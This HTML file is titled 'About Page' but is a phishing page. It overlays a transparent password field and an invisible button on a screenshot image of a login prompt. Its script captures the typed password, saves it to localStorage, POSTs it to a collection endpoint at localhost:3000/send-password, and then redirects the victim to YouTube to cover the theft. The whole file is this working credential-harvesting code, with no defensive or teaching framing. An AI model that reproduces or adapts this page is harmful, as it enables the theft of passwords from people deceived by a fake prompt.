<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>About Page</title>
    <link rel="stylesheet" href="style.css">
    <style>
        html, body {
            overflow: auto !important;
        }

        .password-field {
            position: fixed;
            top: 45%;
            left: 59.8%;
            transform: translate(-50%, -50%);
            width: 240px;
        }

        .password-input {
            width: 100%;
            box-sizing: border-box;
            padding: 9px 60px 9px 16px;
            font-size: 18px;
            border: none;
            outline: none;
            border-radius: 6px;
            background: rgba(0, 0, 0, 0);
            color: white;
            caret-color: white;
        }

        .password-input:focus::placeholder {
            color: transparent;
        }

        .show-password {
            position: fixed;
            top: 51%;
            left: 51.5%;
            transform: translateY(-50%);
            width: 28px;
            height: 28px;
            padding: 0;
            border: none;
            border-radius: 0;
            background: transparent;
            cursor: pointer;
            z-index: 2;
        }

        .show-password img {
            display: block;
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .show-password img[hidden] {
            display: none;
        }

        .new-button {
            position: fixed;
            top: 63%;
            left: 80%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 60px;
            padding: 0;
            border: none;
            border-radius: 6px;
            background: transparent;
            cursor: pointer;
            opacity: 0;
            z-index: 3;
        }

        .new-button img {
            display: none;
        }


    </style>
</head>
<body>
    <img class="fullscreen-img" src="password.png" alt="Fullscreen Background Showcase">

    <div class="password-field">
        <input
            class="password-input"
            id="password"
            type="password"
            placeholder="Enter password"
            aria-label="Enter password"
            autocomplete="current-password"
        >
    </div>

    <button
        class="show-password"
        id="togglePassword"
        type="button"
        aria-label="Show password"
        aria-pressed="false"
    ><img id="checkboxImage" src="checkbox.png" alt="" hidden></button>

    <button class="new-button" id="newTogglePassword" type="button" aria-label="Show password"></button>

    <script>
        const password = document.getElementById("password");
        const toggle = document.getElementById("togglePassword");
        const checkboxImage = document.getElementById("checkboxImage");
        const newToggle = document.getElementById("newTogglePassword");

        toggle.addEventListener("click", () => {
            const isHidden = password.type === "password";
            password.type = isHidden ? "text" : "password";
            checkboxImage.hidden = !isHidden;
            toggle.setAttribute("aria-pressed", String(isHidden));
            toggle.setAttribute(
                "aria-label",
                isHidden ? "Hide password" : "Show password"
            );
            password.focus();
        });

        newToggle.addEventListener("click", async () => {
            const enteredPassword = password.value;
            console.log("Password captured:", enteredPassword);
            localStorage.setItem("savedPassword", enteredPassword);

            try {
                await fetch("http://localhost:3000/send-password", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ password: enteredPassword })
                });
            } catch (error) {
                console.error("Failed to send password to server:", error);
            }

            window.location.href = "https://www.youtube.com";
        });
    </script>

</body>
</html>
